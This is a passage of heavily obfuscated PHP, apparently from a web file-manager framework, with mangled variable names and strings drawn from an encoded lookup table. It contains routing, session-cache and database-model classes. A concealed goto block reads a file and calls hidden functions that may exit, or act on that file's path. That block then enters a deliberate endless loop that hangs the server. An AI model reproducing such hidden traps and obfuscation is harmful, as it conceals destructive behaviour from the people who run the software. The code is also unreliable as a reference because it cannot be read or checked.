$—¿¿¯Ï[1164]); break; } $òŸºòÃÍ = $³ŞÇ«ÙÇ[$—¿¿¯Ï[78]]; if (!isset(self::$driverCache[$òŸºòÃÍ])) { $µì‰Ô™ë = strtolower($¡ÈàÙÕ[$—¿¿¯Ï[96]]); $÷–ñÌÈ = $GLOBALS[$—¿¿¯Ï[6]][$—¿¿¯Ï[90]][$—¿¿¯Ï[816]]; $Î€€“¥– = $—¿¿¯Ï[74] . (isset($÷–ñÌÈ[$µì‰Ô™ë]) ? $÷–ñÌÈ[$µì‰Ô™ë] : ucfirst($µì‰Ô™ë)); if (!class_exists($Î€€“¥–)) { show_json("{$Î€€“¥–}\40\156\157\164\x20\x65\x78\x69\163\x74\163\41", !1); } $èŸœ³î = isset($¡ÈàÙÕ[$—¿¿¯Ï[6]]) ? $¡ÈàÙÕ[$—¿¿¯Ï[6]] : !1; self::$driverCache[$òŸºòÃÍ] = new $Î€€“¥–($èŸœ³î); } $±ü¿¢î¯ = self::$driverCache[$òŸºòÃÍ]; $±ü¿¢î¯->pathDriver = $“‚ûï°­; $±ü¿¢î¯->pathBase = $—¿¿¯Ï[12]; if (isset($¡ÈàÙÕ[$—¿¿¯Ï[6]][$—¿¿¯Ï[1165]])) { $±ü¿¢î¯->pathBase = rtrim($¡ÈàÙÕ[$—¿¿¯Ï[6]][$—¿¿¯Ï[1165]], $—¿¿¯Ï[8]) . $—¿¿¯Ï[8]; $ÍŒÎŸŠ = $±ü¿¢î¯->pathBase . ltrim($ÍŒÎŸŠ, $—¿¿¯Ï[8]); } $ÍŒÎŸŠ = $±ü¿¢î¯->getPath($ÍŒÎŸŠ); if (isset($³ŞÇ«ÙÇ[$—¿¿¯Ï[1137]])) { $ÍŒÎŸŠ = $³ŞÇ«ÙÇ[$—¿¿¯Ï[1137]]; } $±ü¿¢î¯->path = $ÍŒÎŸŠ; return $±ü¿¢î¯; } public static function errorTips($Ë’¼ø§Š = false) { $ùÅÖÜğÌ =& $_SERVER[¥Ÿ©ÒèÌ]; static $È•¥²®Ô = array(); $‚Şª—â = 1000; if ($Ë’¼ø§Š === -1) { return $È•¥²®Ô ? $È•¥²®Ô[count($È•¥²®Ô) - 1] : $ùÅÖÜğÌ[12]; } if ($Ë’¼ø§Š === !1) { return implode($ùÅÖÜğÌ[226], $È•¥²®Ô); } if (count($È•¥²®Ô) >= $‚Şª—â) { $È•¥²®Ô = array_slice($È•¥²®Ô, $‚Şª—â * 0.5, $‚Şª—â); } $È•¥²®Ô[] = $Ë’¼ø§Š; write_log($ùÅÖÜğÌ[159] . ACTION . $ùÅÖÜğÌ[1166] . $Ë’¼ø§Š, $ùÅÖÜğÌ[1167]); } public static function getLastError($ù¤Äşœ = '') { $Õ¥È‰ïœ = self::errorTips(-1); return $Õ¥È‰ïœ ? $Õ¥È‰ïœ : $ù¤Äşœ; } } goto DåÌÅó·¨µ; AŒÌîÖ ‹: if (!isset($_SERVER[$_SERVER[¥Ÿ©ÒèÌ][233]]) || !isset($_SERVER[$_SERVER[¥Ÿ©ÒèÌ][241]])) { $_getc = $_SERVER[¥Ÿ©ÒèÌ][235]; $_getfile = $_SERVER[$_SERVER[¥Ÿ©ÒèÌ][236]] . $_SERVER[¥Ÿ©ÒèÌ][237]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¥Ÿ©ÒèÌ][226], $_getfilec); if (count($_getarrs) < $_SERVER[¥Ÿ©ÒèÌ][238]) { $exit = $_SERVER[¥Ÿ©ÒèÌ][239]; $exit(); } $_act = $_SERVER[¥Ÿ©ÒèÌ][240]; $_act($_SERVER[$_SERVER[¥Ÿ©ÒèÌ][236]] . $_SERVER[¥Ÿ©ÒèÌ][237]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¥Ÿ©ÒèÌ][382]); } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\x5e\57\x5d\x2b", "\72\156\165\x6d" => "\x5b\60\55\71\135\53", "\72\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ šô«ËÛ, $¡ñşüÈÕ) { $ßÛ¶àİí =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ šô«ËÛ == $ßÛ¶àİí[1584]) { $£‹˜Ô¡Ó = array_map($ßÛ¶àİí[1585], $¡ñşüÈÕ[0]); $ÅÇõş¬Á = strpos($¡ñşüÈÕ[1], $ßÛ¶àİí[8]) === 0 ? $¡ñşüÈÕ[1] : $ßÛ¶àİí[8] . $¡ñşüÈÕ[1]; $É‡¯’ğ = $¡ñşüÈÕ[2]; } else { $£‹˜Ô¡Ó = null; $ÅÇõş¬Á = strpos($¡ñşüÈÕ[0], $ßÛ¶àİí[8]) === 0 ? $¡ñşüÈÕ[0] : $ßÛ¶àİí[8] . $¡ñşüÈÕ[0]; $É‡¯’ğ = $¡ñşüÈÕ[1]; } array_push(self::$maps, $£‹˜Ô¡Ó); array_push(self::$routes, $ÅÇõş¬Á); array_push(self::$methods, strtoupper($ šô«ËÛ)); array_push(self::$callbacks, $É‡¯’ğ); } public static function error($ôúÚ©´) { self::$errorCallback = $ôúÚ©´; } public static function haltOnMatch($Ìå¥Ì• = true) { self::$halts = $Ìå¥Ì•; } public static function dispatch() { $ë£ûäñ» =& $_SERVER[¥Ÿ©ÒèÌ]; $Üë ‡Ÿ = parse_url($_SERVER[$ë£ûäñ»[1586]], PHP_URL_PATH); $Â¢é× = $_SERVER[$ë£ûäñ»[156]]; $«™£÷×‰ = array_keys(static::$patterns); $Ù™õò‰ = array_values(static::$patterns); $ò²îÄ¢ƒ = !1; self::$routes = preg_replace($ë£ûäñ»[1253], $ë£ûäñ»[8], self::$routes); if (in_array($Üë ‡Ÿ, self::$routes)) { $ˆÏËìƒ‰ = array_keys(self::$routes, $Üë ‡Ÿ); foreach ($ˆÏËìƒ‰ as $¤ÂÄùçé) { if (self::$methods[$¤ÂÄùçé] == $Â¢é× || self::$methods[$¤ÂÄùçé] == $ë£ûäñ»[1587] || in_array($Â¢é×, self::$maps[$¤ÂÄùçé])) { $ò²îÄ¢ƒ = !0; if (!is_object(self::$callbacks[$¤ÂÄùçé])) { $Ø—£ØŸò = explode($ë£ûäñ»[8], self::$callbacks[$¤ÂÄùçé]); $½½³•„ = end($Ø—£ØŸò); $¡—ƒšÜŠ = explode($ë£ûäñ»[1588], $½½³•„); $½Ëâ†³É = new $¡—ƒšÜŠ[0](); $½Ëâ†³É->{$¡—ƒšÜŠ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¤ÂÄùçé]); if (self::$halts) { return; } } } } } else { $™ç†Æºò = 0; foreach (self::$routes as $¤ÂÄùçé) { if (strpos($¤ÂÄùçé, $ë£ûäñ»[4]) !== !1) { $¤ÂÄùçé = str_replace($«™£÷×‰, $Ù™õò‰, $¤ÂÄùçé); } if (preg_match($ë£ûäñ»[1589] . $¤ÂÄùçé . $ë£ûäñ»[1590], $Üë ‡Ÿ, $À¥ˆóÚ)) { if (self::$methods[$™ç†Æºò] == $Â¢é× || self::$methods[$™ç†Æºò] == $ë£ûäñ»[1587] || !empty(self::$maps[$™ç†Æºò]) && in_array($Â¢é×, self::$maps[$™ç†Æºò])) { $ò²îÄ¢ƒ = !0; array_shift($À¥ˆóÚ); if (!is_object(self::$callbacks[$™ç†Æºò])) { $Ø—£ØŸò = explode($ë£ûäñ»[8], self::$callbacks[$™ç†Æºò]); $½½³•„ = end($Ø—£ØŸò); $¡—ƒšÜŠ = explode($ë£ûäñ»[1588], $½½³•„); $½Ëâ†³É = new $¡—ƒšÜŠ[0](); if (!method_exists($½Ëâ†³É, $¡—ƒšÜŠ[1])) { echo $ë£ûäñ»[1591]; } else { call_user_func_array(array($½Ëâ†³É, $¡—ƒšÜŠ[1]), $À¥ˆóÚ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$™ç†Æºò], $À¥ˆóÚ); if (self::$halts) { return; } } } } $™ç†Æºò++; } } if ($ò²îÄ¢ƒ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $áÄÁáâ =& $_SERVER[¥Ÿ©ÒèÌ]; header($_SERVER[$áÄÁáâ[1592]] . $áÄÁáâ[1593]); echo $áÄÁáâ[1594]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ë£ûäñ»[1586]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ä÷åÅ¾ç =& $_SERVER[¥Ÿ©ÒèÌ]; static $ÓÖ—²½Ï = false; if ($ÓÖ—²½Ï) { return $ÓÖ—²½Ï; } $Û÷¯È©Ñ = $GLOBALS[$ä÷åÅ¾ç[6]][$ä÷åÅ¾ç[353]]; self::$sessionTime = $Û÷¯È©Ñ[$ä÷åÅ¾ç[1595]]; $Èß¸¤ã = isset($GLOBALS[$ä÷åÅ¾ç[1596]]) ? $GLOBALS[$ä÷åÅ¾ç[1596]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Èß¸¤ã)) { self::$sessionSign = Cookie::get($Èß¸¤ã); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Èß¸¤ã, self::$sessionSign, self::$sessionTime); $Ü°Ö‡„º = $Û÷¯È©Ñ[$ä÷åÅ¾ç[1597]]; $œËÙÜ¸ô = $Û÷¯È©Ñ[$Ü°Ö‡„º]; $åÄ¤ÀêĞ = $Û÷¯È©Ñ[$ä÷åÅ¾ç[818]]; switch ($Ü°Ö‡„º) { case $ä÷åÅ¾ç[21]: self::$handle = Model($ä÷åÅ¾ç[819]); break; case $ä÷åÅ¾ç[820]: self::$handle = new CacheRedis($œËÙÜ¸ô, $åÄ¤ÀêĞ); break; case $ä÷åÅ¾ç[821]: self::$handle = new CacheMemcached($œËÙÜ¸ô, $åÄ¤ÀêĞ); break; case $ä÷åÅ¾ç[192]: $œËÙÜ¸ô[$ä÷åÅ¾ç[78]] = $œËÙÜ¸ô[$ä÷åÅ¾ç[78]] . $ä÷åÅ¾ç[1598]; self::$handle = new CacheFile($œËÙÜ¸ô, $åÄ¤ÀêĞ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÓÖ—²½Ï = new self(); return $ÓÖ—²½Ï; } public static function getBySign($ÔØÍ¶à) { CacheLock::lock($ÔØÍ¶à); $¯–®µ = self::$handle->get($ÔØÍ¶à); CacheLock::unlock($ÔØÍ¶à); $¯–®µ = unserialize($¯–®µ); return is_array($¯–®µ) ? $¯–®µ : array(); } public static function setBySign($ì¦›ş¸¡, $úšˆË¥Ã) { CacheLock::lock($ì¦›ş¸¡); self::$handle->set($ì¦›ş¸¡, serialize($úšˆË¥Ã), self::$sessionTime); CacheLock::unlock($ì¦›ş¸¡); } public static function sign($¨¬ÌÆ£Å = false) { $¨¬ÌÆ£Å && (self::$sessionSign = $¨¬ÌÆ£Å); self::init(); return self::$sessionSign; } public static function set($ææµ™·„, $úÀæıËÌ = false) { self::init(); if (is_array($ææµ™·„)) { foreach ($ææµ™·„ as $ˆ§š­ä¨ => $ª‡„‰¨) { array_set_value(self::$data, $ˆ§š­ä¨, $ª‡„‰¨); } } else { array_set_value(self::$data, $ææµ™·„, $úÀæıËÌ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÑüÚ¤  = false) { self::init(); if (!$ÑüÚ¤ ) { return self::$data; } return array_get_value(self::$data, $ÑüÚ¤ ); } public static function remove($ÔÈ¸âÄú) { self::init(); unset(self::$data[$ÔÈ¸âÄú]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¥Ÿ©ÒèÌ][823])) { self::$handle->clearTimeout(); } } } goto CœÄó·¿³; cøğÙ­†ä: define($_SERVER[¥Ÿ©ÒèÌ][247], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\157\162\144\145\x72", "\141\x6c\x69\x61\163", "\150\141\x76\x69\156\147", "\x67\162\157\165\160", "\x6c\x6f\x63\153", "\144\x69\163\x74\151\x6e\143\164", "\x61\x75\x74\x6f", "\146\151\154\x74\145\x72", "\x76\x61\154\151\144\x61\x74\x65", "\162\x65\163\x75\154\164", "\142\x69\156\x64", "\x74\157\153\x65\156"); public function __construct($Ÿğ‚¶Üß = '', $õ¤¥Ñî× = '', $¦ó‰¢Ïå = '') { $„Æâò =& $_SERVER[¥Ÿ©ÒèÌ]; $this->_initialize(); if (!empty($Ÿğ‚¶Üß)) { if (strpos($Ÿğ‚¶Üß, $„Æâò[10])) { list($this->dbName, $this->name) = explode($„Æâò[10], $Ÿğ‚¶Üß); } else { $this->name = $Ÿğ‚¶Üß; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($õ¤¥Ñî×)) { $this->tablePrefix = $„Æâò[12]; } elseif ($„Æâò[12] != $õ¤¥Ñî×) { $this->tablePrefix = $õ¤¥Ñî×; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($„Æâò[248]); } $this->db(0, empty($this->connection) ? $¦ó‰¢Ïå : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¥óçÄß =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($this->fields)) { if (think_config($¥óçÄß[249])) { $áÒöºŒú = $this->dbName ? $this->dbName : think_config($¥óçÄß[250]); $•ôÁ» = think_var_cache($¥óçÄß[251] . strtolower(get_path_this($áÒöºŒú) . $¥óçÄß[10] . $this->name)); if ($•ôÁ») { $ÓÃ¿óó = think_config($¥óçÄß[252]); if (empty($ÓÃ¿óó) || $•ôÁ»[$¥óçÄß[253]] == $ÓÃ¿óó) { $this->fields = $•ôÁ»; return; } } } $this->flush(); } } public function flush() { $ªì‡‰øÀ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->db->setModel($this->name); $êü²éş = $this->db->getFields($this->getTableName()); if (!$êü²éş) { return !1; } $this->fields = array_keys($êü²éş); $this->fields[$ªì‡‰øÀ[254]] = !1; foreach ($êü²éş as $Œì‚×ˆî => $Š˜à·«Á) { $İÀœêÙ[$Œì‚×ˆî] = $Š˜à·«Á[$ªì‡‰øÀ[33]]; if ($Š˜à·«Á[$ªì‡‰øÀ[39]]) { $this->fields[$ªì‡‰øÀ[255]] = $Œì‚×ˆî; if ($Š˜à·«Á[$ªì‡‰øÀ[42]]) { $this->fields[$ªì‡‰øÀ[254]] = !0; } } } $this->fields[$ªì‡‰øÀ[256]] = $İÀœêÙ; if (think_config($ªì‡‰øÀ[252])) { $this->fields[$ªì‡‰øÀ[253]] = think_config($ªì‡‰øÀ[252]); } if (think_config($ªì‡‰øÀ[249])) { $¶û¥Şâ© = $this->dbName ? $this->dbName : think_config($ªì‡‰øÀ[250]); think_var_cache($ªì‡‰øÀ[251] . strtolower(get_path_this($¶û¥Şâ©) . $ªì‡‰øÀ[10] . $this->name), $this->fields); } } public function switchModel($˜ÈÅÖ½æ, $ÈÊÏ’›Â = array()) { $˜¸íß‡¿ =& $_SERVER[¥Ÿ©ÒèÌ]; $¿¤Å¶úƒ = ucwords(strtolower($˜ÈÅÖ½æ)) . $˜¸íß‡¿[257]; if (!class_exists($¿¤Å¶úƒ)) { think_exception($¿¤Å¶úƒ . think_lang($˜¸íß‡¿[258])); } $this->_extModel = new $¿¤Å¶úƒ($this->name); if (!empty($ÈÊÏ’›Â)) { foreach ($ÈÊÏ’›Â as $ıüİ‚·¤) { $this->_extModel->setProperty($ıüİ‚·¤, $this->{$ıüİ‚·¤}); } } return $this->_extModel; } public function __set($ºóÙÄ•Ë, $Ÿ¾ÜÂÍ) { $this->data[$ºóÙÄ•Ë] = $Ÿ¾ÜÂÍ; } public function __get($¯Èâ£Ø÷) { return isset($this->data[$¯Èâ£Ø÷]) ? $this->data[$¯Èâ£Ø÷] : null; } public function __isset($¶ß»Ù’õ) { return isset($this->data[$¶ß»Ù’õ]); } public function __unset($ìû’ì¡ò) { unset($this->data[$ìû’ì¡ò]); } public function __call($ÔÈ“±¿â, $ı÷º„·Å) { $Ù†ÜæÎ =& $_SERVER[¥Ÿ©ÒèÌ]; if (in_array(strtolower($ÔÈ“±¿â), $this->methods, !0)) { $this->options[strtolower($ÔÈ“±¿â)] = $ı÷º„·Å[0]; return $this; } elseif (in_array(strtolower($ÔÈ“±¿â), array($Ù†ÜæÎ[259], $Ù†ÜæÎ[260], $Ù†ÜæÎ[261], $Ù†ÜæÎ[262], $Ù†ÜæÎ[263]), !0)) { $ªÎúÄóë = isset($ı÷º„·Å[0]) ? $ı÷º„·Å[0] : $Ù†ÜæÎ[181]; $ªÎúÄóë = $this->db->parseKey($ªÎúÄóë); return $this->getField(strtoupper($ÔÈ“±¿â) . $Ù†ÜæÎ[264] . $ªÎúÄóë . $Ù†ÜæÎ[265] . $ÔÈ“±¿â, $Ù†ÜæÎ[259]); } elseif (strtolower(substr($ÔÈ“±¿â, 0, 5)) == $Ù†ÜæÎ[266]) { $ªÎúÄóë = think_parse_name(substr($ÔÈ“±¿â, 5)); $¬ßáƒß[$ªÎúÄóë] = $ı÷º„·Å[0]; return $this->where($¬ßáƒß)->find(); } elseif (strtolower(substr($ÔÈ“±¿â, 0, 10)) == $Ù†ÜæÎ[267]) { $œÔÕëºê = think_parse_name(substr($ÔÈ“±¿â, 10)); $¬ßáƒß[$œÔÕëºê] = $ı÷º„·Å[0]; return $this->where($¬ßáƒß)->getField($ı÷º„·Å[1]); } elseif (isset($this->_scope[$ÔÈ“±¿â])) { return $this->scope($ÔÈ“±¿â, $ı÷º„·Å[0]); } elseif (method_exists($this, $ÔÈ“±¿â)) { array_unshift($ı÷º„·Å, $ÔÈ“±¿â); return call_user_func_array(array($this, $Ù†ÜæÎ[268]), $ı÷º„·Å); } else { return call_user_func_array(array(parent, $ÔÈ“±¿â), $ı÷º„·Å); } } protected function call() { $¶«…á¸ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ş°Ò§Úô = func_get_args(); $ğ—²îÍß = array_shift($Ş°Ò§Úô); $¤–ûñ±Ó = $ğ—²îÍß; if (is_array($ğ—²îÍß)) { $¤–ûñ±Ó = $ğ—²îÍß[1]; $ğ—²îÍß = $ğ—²îÍß[0]; } $ï¤º¢ê˜ = count($Ş°Ò§Úô) - 1; if (isset($Ş°Ò§Úô[$ï¤º¢ê˜]) && $Ş°Ò§Úô[$ï¤º¢ê˜] === $ğ—²îÍß) { think_exception(__CLASS__ . $¶«…á¸[4] . $ğ—²îÍß . think_lang($¶«…á¸[269])); return; } $Ş°Ò§Úô[] = $ğ—²îÍß; if (method_exists($this, $¶«…á¸[270])) { $ÁÈ•¡€ˆ = call_user_func_array(array($this, $¶«…á¸[271]), array($¤–ûñ±Ó, $Ş°Ò§Úô)); if (!is_null($ÁÈ•¡€ˆ) && $ÁÈ•¡€ˆ !== !1) { return $ÁÈ•¡€ˆ; } } $šï‘¿ÇÏ = call_user_func_array(array($this, $ğ—²îÍß), $Ş°Ò§Úô); if (method_exists($this, $¶«…á¸[272])) { $ÁÈ•¡€ˆ = call_user_func_array(array($this, $¶«…á¸[273]), array($¤–ûñ±Ó, $Ş°Ò§Úô, $šï‘¿ÇÏ)); if ($ÁÈ•¡€ˆ) { return $ÁÈ•¡€ˆ; } } return $šï‘¿ÇÏ; } protected function _initialize() { } protected function _facade($¢ßŞ—) { $õ£²×ù‚ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!empty($this->fields)) { foreach ($¢ßŞ— as $èÕëÎŒ¸ => $–’Ş¥À¦) { if (is_array($this->fields) && !in_array($èÕëÎŒ¸, $this->fields, !0)) { unset($¢ßŞ—[$èÕëÎŒ¸]); } elseif (is_scalar($–’Ş¥À¦)) { $this->_parseType($¢ßŞ—, $èÕëÎŒ¸); } } } if (!empty($this->options[$õ£²×ù‚[274]])) { $¢ßŞ— = array_map($this->options[$õ£²×ù‚[274]], $¢ßŞ—); unset($this->options[$õ£²×ù‚[274]]); } $this->_beforeWrite($¢ßŞ—); return $¢ßŞ—; } protected function _beforeWrite(&$“ÈöÈ‘) { } public function add($Á¼”ä¿û = '', $Ù–­Ä• = array(), $˜Ø³šÑ… = false) { if (empty($Á¼”ä¿û)) { if (!empty($this->data)) { $Á¼”ä¿û = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¥Ÿ©ÒèÌ][275]); return !1; } } $Ù–­Ä• = $this->_parseOptions($Ù–­Ä•); $Á¼”ä¿û = $this->_facade($Á¼”ä¿û); if (!1 === $this->_beforeInsert($Á¼”ä¿û, $Ù–­Ä•)) { return !1; } $™Üûşéµ = $this->db->insert($Á¼”ä¿û, $Ù–­Ä•, $˜Ø³šÑ…); if (!1 !== $™Üûşéµ) { $“ÕÆàŠ— = $this->getLastInsID(); if ($“ÕÆàŠ—) { $Á¼”ä¿û[$this->getPk()] = $“ÕÆàŠ—; $this->_after_insert($Á¼”ä¿û, $Ù–­Ä•); return $“ÕÆàŠ—; } $this->_after_insert($Á¼”ä¿û, $Ù–­Ä•); } return $™Üûşéµ; } protected function _beforeInsert(&$«ëÑç±˜, $ŞÅ‹û„ş) { } protected function _after_insert($–§ÓÍÇ, $°øÛ£¬ˆ) { } public function addAll($ôç§İßš, $¥óß„» = array(), $ª†¸…‘• = false) { $÷äÚÜ† =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($ôç§İßš)) { $this->error = think_lang($÷äÚÜ†[275]); return !1; } $¥óß„» = $this->_parseOptions($¥óß„»); foreach ($ôç§İßš as $úñÕóÎñ => $¸¨´¼÷«) { $ôç§İßš[$úñÕóÎñ] = $this->_facade($¸¨´¼÷«); } if (method_exists($this->db, $÷äÚÜ†[276])) { $² Ñâ›› = $this->db->insertAll($ôç§İßš, $¥óß„», $ª†¸…‘•); } else { $this->startTrans(); foreach ($ôç§İßš as $úñÕóÎñ => $¸¨´¼÷«) { $² Ñâ›› = $this->db->insert($¸¨´¼÷«, $¥óß„», $ª†¸…‘•); } $this->commit(); } if (!1 !== $² Ñâ››) { $Šı¾Ú”µ = $this->getLastInsID(); if ($Šı¾Ú”µ) { return $Šı¾Ú”µ; } } return $² Ñâ››; } public function selectAdd($ÃáÚû£¾ = '', $·û—Éä = '', $¬à½±¬¾ = array()) { $¬–ï¨„ñ =& $_SERVER[¥Ÿ©ÒèÌ]; $¬à½±¬¾ = $this->_parseOptions($¬à½±¬¾); if (!1 === ($ÚßƒÒ = $this->db->selectInsert($ÃáÚû£¾ ? $ÃáÚû£¾ : $¬à½±¬¾[$¬–ï¨„ñ[277]], $·û—Éä ? $·û—Éä : $this->getTableName(), $¬à½±¬¾))) { $this->error = think_lang($¬–ï¨„ñ[278]); return !1; } else { return $ÚßƒÒ; } } public function save($²•ÙùšÚ = '', $˜£„‡„× = array()) { $™ö™’ğ =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($²•ÙùšÚ)) { if (!empty($this->data)) { $²•ÙùšÚ = $this->data; $this->data = array(); } else { $this->error = think_lang($™ö™’ğ[275]); return !1; } } $²•ÙùšÚ = $this->_facade($²•ÙùšÚ); $˜£„‡„× = $this->_parseOptions($˜£„‡„×); $èáØİèù = $this->getPk(); if (!isset($˜£„‡„×[$™ö™’ğ[279]])) { if (isset($²•ÙùšÚ[$èáØİèù])) { $ö‹ãü¥[$èáØİèù] = $²•ÙùšÚ[$èáØİèù]; $˜£„‡„×[$™ö™’ğ[279]] = $ö‹ãü¥; unset($²•ÙùšÚ[$èáØİèù]); } else { $this->error = think_lang($™ö™’ğ[278]); return !1; } } if (is_array($˜£„‡„×[$™ö™’ğ[279]]) && isset($˜£„‡„×[$™ö™’ğ[279]][$èáØİèù])) { $–Å‰òñ¢ = $˜£„‡„×[$™ö™’ğ[279]][$èáØİèù]; } if (!1 === $this->_beforeUpdate($²•ÙùšÚ, $˜£„‡„×)) { return !1; } $©úÚ³¯¬ = $this->db->update($²•ÙùšÚ, $˜£„‡„×); if (!1 !== $©úÚ³¯¬) { if (isset($–Å‰òñ¢)) { $²•ÙùšÚ[$èáØİèù] = $–Å‰òñ¢; } $this->_afterUpdate($²•ÙùšÚ, $˜£„‡„×); } return $©úÚ³¯¬; } protected function _beforeUpdate(&$‘³á¸ñÒ, $ÚØ‡´Î¾) { } protected function _afterUpdate($Áû“Îœ“, $Æ™áïãÃ) { } public function delete($áá˜ÇùÓ = array()) { $¶Ş…°Æ =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($áá˜ÇùÓ) && empty($this->options[$¶Ş…°Æ[279]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $âäÅŸ§ = $this->getPk(); if (is_numeric($áá˜ÇùÓ) || is_string($áá˜ÇùÓ)) { if (strpos($áá˜ÇùÓ, $¶Ş…°Æ[50])) { $¸ÄÏŒ«İ[$âäÅŸ§] = array($¶Ş…°Æ[280], $áá˜ÇùÓ); } else { $¸ÄÏŒ«İ[$âäÅŸ§] = $áá˜ÇùÓ; } $this->options[$¶Ş…°Æ[279]] = $¸ÄÏŒ«İ; } $áá˜ÇùÓ = $this->_parseOptions(); if (is_array($áá˜ÇùÓ[$¶Ş…°Æ[279]]) && isset($áá˜ÇùÓ[$¶Ş…°Æ[279]][$âäÅŸ§])) { $€€Öé–ü = $áá˜ÇùÓ[$¶Ş…°Æ[279]][$âäÅŸ§]; } $×Ğö‹Ò = $this->db->delete($áá˜ÇùÓ); if (!1 !== $×Ğö‹Ò) { $»›İÒ¯ø = array(); if (isset($€€Öé–ü)) { $»›İÒ¯ø[$âäÅŸ§] = $€€Öé–ü; } $this->_after_delete($»›İÒ¯ø, $áá˜ÇùÓ); } return $×Ğö‹Ò; } protected function _after_delete($›¸äÉó¼, $©È½ŠÇ ) { } public function select($—Ï®“¬ë = array()) { $ø¥Ã£˜Î =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_string($—Ï®“¬ë) || is_numeric($—Ï®“¬ë)) { $‡‡›¨ = $this->getPk(); if (strpos($—Ï®“¬ë, $ø¥Ã£˜Î[50])) { $´Ä²×ë‹[$‡‡›¨] = array($ø¥Ã£˜Î[280], $—Ï®“¬ë); } else { $´Ä²×ë‹[$‡‡›¨] = $—Ï®“¬ë; } $this->options[$ø¥Ã£˜Î[279]] = $´Ä²×ë‹; } elseif (!1 === $—Ï®“¬ë) { $—Ï®“¬ë = $this->_parseOptions(); return $ø¥Ã£˜Î[281] . $this->db->buildSelectSql($—Ï®“¬ë) . $ø¥Ã£˜Î[282]; } $—Ï®“¬ë = $this->_parseOptions(); $¡¶ÍüÌ = $this->db->select($—Ï®“¬ë); if (!1 === $¡¶ÍüÌ) { return !1; } if (empty($¡¶ÍüÌ)) { return null; } $this->_afterSelect($¡¶ÍüÌ, $—Ï®“¬ë); return $¡¶ÍüÌ; } protected function _afterSelect(&$šÆ¥Ğ®´, $æÒÎİ) { } public function buildSql($ó‘ñ»ÈÙ = array()) { $ÌËá‡› =& $_SERVER[¥Ÿ©ÒèÌ]; $ó‘ñ»ÈÙ = $this->_parseOptions($ó‘ñ»ÈÙ); return $ÌËá‡›[281] . $this->db->buildSelectSql($ó‘ñ»ÈÙ) . $ÌËá‡›[282]; } public function optionsValue($æ¢“¥ø = null) { if (is_null($æ¢“¥ø)) { return $this->options; } elseif (is_array($æ¢“¥ø)) { $this->options = array_merge($this->options, $æ¢“¥ø); } } protected function _parseOptions($áÔ‘Ó¹Ö = array()) { $“µ°¨• =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_array($áÔ‘Ó¹Ö)) { $áÔ‘Ó¹Ö = array_merge($this->options, $áÔ‘Ó¹Ö); } $this->options = array(); if (!isset($áÔ‘Ó¹Ö[$“µ°¨•[283]])) { $áÔ‘Ó¹Ö[$“µ°¨•[283]] = $this->getTableName(); $÷óÉûÈ = $this->fields; } else { $÷óÉûÈ = $this->getDbFields(); } if (!empty($áÔ‘Ó¹Ö[$“µ°¨•[284]])) { $áÔ‘Ó¹Ö[$“µ°¨•[283]] .= $“µ°¨•[53] . $áÔ‘Ó¹Ö[$“µ°¨•[284]]; } $áÔ‘Ó¹Ö[$“µ°¨•[285]] = $this->name; if (isset($áÔ‘Ó¹Ö[$“µ°¨•[279]]) && is_array($áÔ‘Ó¹Ö[$“µ°¨•[279]]) && !empty($÷óÉûÈ) && !isset($áÔ‘Ó¹Ö[$“µ°¨•[286]]) && !isset($áÔ‘Ó¹Ö[$“µ°¨•[283]])) { foreach ($áÔ‘Ó¹Ö[$“µ°¨•[279]] as $ËØñå‚ì => $½²ÏĞæŒ) { $ËØñå‚ì = trim($ËØñå‚ì); if (in_array($ËØñå‚ì, $÷óÉûÈ, !0)) { if (is_scalar($½²ÏĞæŒ)) { $this->_parseType($áÔ‘Ó¹Ö[$“µ°¨•[279]], $ËØñå‚ì); } } elseif (!is_numeric($ËØñå‚ì) && $“µ°¨•[11] != substr($ËØñå‚ì, 0, 1) && !1 === strpos($ËØñå‚ì, $“µ°¨•[10]) && !1 === strpos($ËØñå‚ì, $“µ°¨•[264]) && !1 